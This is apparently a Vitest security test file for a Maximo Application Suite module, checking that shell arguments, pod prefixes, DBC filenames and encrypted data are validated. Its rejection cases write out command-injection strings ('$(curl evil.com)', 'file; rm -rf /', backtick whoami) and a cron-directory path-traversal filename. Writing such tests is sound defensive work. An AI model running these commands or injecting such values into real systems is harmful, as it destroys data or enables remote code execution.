/**
 * Security tests for MAS module
 * Tests for shell injection prevention, path traversal, podPrefix validation, and crypto input validation
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

describe('sanitizeShellArg', () => {
  it('should accept a simple filename', async () => {
    const { sanitizeShellArg } = await import('../k8s-client');
    expect(() => sanitizeShellArg('myfile.dbc')).not.toThrow();
    expect(sanitizeShellArg('myfile.dbc')).toBe('myfile.dbc');
  });

  it('should accept a simple absolute path', async () => {
    const { sanitizeShellArg } = await import('../k8s-client');
    expect(() => sanitizeShellArg('/opt/IBM/SMP/maximo/tools/maximo/internal')).not.toThrow();
  });

  it('should reject paths with semicolons', async () => {
    const { sanitizeShellArg } = await import('../k8s-client');
    expect(() => sanitizeShellArg('file; rm -rf /')).toThrow('invalid characters');
  });

  it('should reject paths with backticks', async () => {
    const { sanitizeShellArg } = await import('../k8s-client');
    expect(() => sanitizeShellArg('file`whoami`')).toThrow('invalid characters');
  });

  it('should reject paths with $() command substitution', async () => {
    const { sanitizeShellArg } = await import('../k8s-client');
    expect(() => sanitizeShellArg('$(curl evil.com)')).toThrow('invalid characters');
  });

  it('should reject paths with pipe', async () => {
    const { sanitizeShellArg } = await import('../k8s-client');
    expect(() => sanitizeShellArg('file | curl evil.com')).toThrow('invalid characters');
  });

  it('should reject paths with &&', async () => {
    const { sanitizeShellArg } = await import('../k8s-client');
    expect(() => sanitizeShellArg('file && rm -rf /')).toThrow('invalid characters');
  });

  it('should reject paths with newlines', async () => {
    const { sanitizeShellArg } = await import('../k8s-client');
    expect(() => sanitizeShellArg('file\nrm -rf /')).toThrow('invalid characters');
  });

  it('should accept paths with hyphens, underscores, and dots', async () => {
    const { sanitizeShellArg } = await import('../k8s-client');
    expect(sanitizeShellArg('my-file_v2.0.dbc')).toBe('my-file_v2.0.dbc');
  });
});

describe('isValidMasPodPrefix', () => {
  it('should accept valid MAS prefixes ending with known kinds', async () => {
    const { isValidMasPodPrefix } = await import('../pod-manager-types');
    expect(isValidMasPodPrefix('mas-masw-manage-maxinst-')).toBe(true);
    expect(isValidMasPodPrefix('mas-masw-manage-all-')).toBe(true);
    expect(isValidMasPodPrefix('mas-masw-all-')).toBe(true);
    expect(isValidMasPodPrefix('mas-inst2-manage-ui-')).toBe(true);
    expect(isValidMasPodPrefix('mas-prod-manage-cron-')).toBe(true);
  });

  it('should reject arbitrary prefixes without known kinds', async () => {
    const { isValidMasPodPrefix } = await import('../pod-manager-types');
    expect(isValidMasPodPrefix('nginx-')).toBe(false);
    expect(isValidMasPodPrefix('custom-prefix-')).toBe(false);
    expect(isValidMasPodPrefix('')).toBe(false);
    expect(isValidMasPodPrefix('anything')).toBe(false);
  });

  it('should reject prefixes that do not end with a known kind', async () => {
    const { isValidMasPodPrefix } = await import('../pod-manager-types');
    expect(isValidMasPodPrefix('mas-masw-manage-')).toBe(false);
    expect(isValidMasPodPrefix('mas-masw-')).toBe(false);
  });
});

describe('MasImportRequestSchema path traversal prevention', () => {
  it('should reject filenames with path traversal', async () => {
    const { MasImportRequestSchema } = await import('../types');

    const result = MasImportRequestSchema.safeParse({
      dbcContent: '<script/>',
      dbcFilename: '../../etc/cron.d/evil.dbc',
    });
    expect(result.success).toBe(false);
  });

  it('should reject filenames with forward slashes', async () => {
    const { MasImportRequestSchema } = await import('../types');

    const result = MasImportRequestSchema.safeParse({
      dbcContent: '<script/>',
      dbcFilename: 'path/to/file.dbc',
    });
    expect(result.success).toBe(false);
  });

  it('should reject filenames with backslashes', async () => {
    const { MasImportRequestSchema } = await import('../types');

    const result = MasImportRequestSchema.safeParse({
      dbcContent: '<script/>',
      dbcFilename: 'path\\to\\file.dbc',
    });
    expect(result.success).toBe(false);
  });

  it('should accept simple valid filenames', async () => {
    const { MasImportRequestSchema } = await import('../types');

    const result = MasImportRequestSchema.safeParse({
      dbcContent: '<script/>',
      dbcFilename: 'my_script.dbc',
    });
    expect(result.success).toBe(true);
  });

  it('should accept filenames with hyphens and underscores', async () => {
    const { MasImportRequestSchema } = await import('../types');

    const result = MasImportRequestSchema.safeParse({
      dbcContent: '<script/>',
      dbcFilename: 'my-script_v2.dbc',
    });
    expect(result.success).toBe(true);
  });
});

describe('decrypt input length validation', () => {
  const originalEnv = process.env;

  beforeEach(() => {
    vi.resetModules();
    process.env = { ...originalEnv };
  });

  afterEach(() => {
    process.env = originalEnv;
  });

  it('should throw a clear error for data shorter than minimum length', async () => {
    process.env.MAS_ENCRYPTION_KEY = 'test-encryption-key-32-chars-ok';
    const { decrypt } = await import('../crypto');

    // Create a base64 string that decodes to < 28 bytes
    const shortData = Buffer.alloc(10).toString('base64');
    expect(() => decrypt(shortData)).toThrow('too short');
  });

  it('should throw a clear error for empty encrypted data', async () => {
    process.env.MAS_ENCRYPTION_KEY = 'test-encryption-key-32-chars-ok';
    const { decrypt } = await import('../crypto');

    const emptyData = Buffer.alloc(0).toString('base64');
    expect(() => decrypt(emptyData)).toThrow('too short');
  });
});
